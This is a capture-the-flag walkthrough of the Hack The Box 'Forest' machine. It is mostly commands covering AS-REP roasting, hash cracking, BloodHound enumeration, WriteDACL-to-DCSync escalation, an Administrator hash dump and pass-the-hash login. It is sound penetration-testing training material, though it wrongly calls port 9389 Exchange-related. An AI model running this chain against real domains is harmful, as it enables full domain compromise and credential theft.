# Forest — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |
| **IP** | `10.129.82.174` |
| **Domain** | `htb.local` / `FOREST.htb.local` |

## Synopsis

Forest is an easy Windows **Active Directory** Domain Controller (with Exchange installed).
Anonymous LDAP/RPC enumeration lists domain users, and the service account `svc-alfresco` has
**"Do not require Kerberos pre-authentication"** set, allowing an **AS-REP Roasting** attack.
The retrieved hash cracks offline, giving WinRM access. BloodHound shows `svc-alfresco` is
(transitively) a member of **Account Operators** and **Exchange Windows Permissions**, which
holds **WriteDACL** over the domain. That right is abused to grant a controlled principal
**DCSync** rights, dump the Administrator NT hash, and log in via **Pass-the-Hash**.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 10.129.82.174
nmap -p53,88,135,139,389,445,464,593,636,5985,9389 -sCV 10.129.82.174
```

DNS, Kerberos, LDAP, SMB, WinRM, plus the Exchange-related `9389` (ADWS). Add
`htb.local` and `forest.htb.local` to `/etc/hosts`.

### Enumerating users (anonymous)

```bash
rpcclient -U "" -N 10.129.82.174 -c "enumdomusers"
# or
crackmapexec smb 10.129.82.174 --users
```

This yields the user list, including service accounts such as **svc-alfresco**.

---

## Foothold — AS-REP Roasting

`svc-alfresco` does not require Kerberos pre-authentication, so an AS-REP can be requested and
cracked offline:

```bash
GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.129.82.174
# $krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

Crack it:

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# svc-alfresco : s3rvice
```

Log in over WinRM:

```bash
evil-winrm -i 10.129.82.174 -u svc-alfresco -p 's3rvice'
```

The **user flag** is in `C:\Users\svc-alfresco\Desktop\user.txt`.

---

## Privilege Escalation — Exchange WriteDACL → DCSync

Run BloodHound:

```bash
bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns 10.129.82.174 -c all
```

`svc-alfresco` is a member of **Account Operators** and (via group nesting) of **Exchange
Windows Permissions**, which has **WriteDACL** on the domain object. The attack path:

1. Create a user (Account Operators can create users) and add it to Exchange Windows
   Permissions — or operate directly as `svc-alfresco`:

   ```powershell
   net user hacker Hacker123! /add /domain
   net group "Exchange Windows Permissions" hacker /add
   ```

2. Using that WriteDACL right, grant the controlled account **DCSync** (DS-Replication-Get-
   Changes / -All) over the domain:

   ```powershell
   # with PowerView loaded
   $pass = ConvertTo-SecureString 'Hacker123!' -AsPlainText -Force
   $cred = New-Object System.Management.Automation.PSCredential('htb\hacker',$pass)
   Add-DomainObjectAcl -Credential $cred -TargetIdentity 'DC=htb,DC=local' \
     -PrincipalIdentity hacker -Rights DCSync
   ```

3. DCSync the Administrator hash:

   ```bash
   secretsdump.py htb.local/hacker:'Hacker123!'@10.129.82.174 -just-dc-user Administrator
   # Administrator:500:aad3b...:<admin-nt-hash>:::
   ```

4. Pass-the-Hash to SYSTEM:

   ```bash
   psexec.py htb.local/Administrator@10.129.82.174 -hashes :<admin-nt-hash>
   # or: evil-winrm -i 10.129.82.174 -u Administrator -H <admin-nt-hash>
   ```

```
C:\> whoami
htb\administrator
```

The **root flag** is in `C:\Users\Administrator\Desktop\root.txt`.
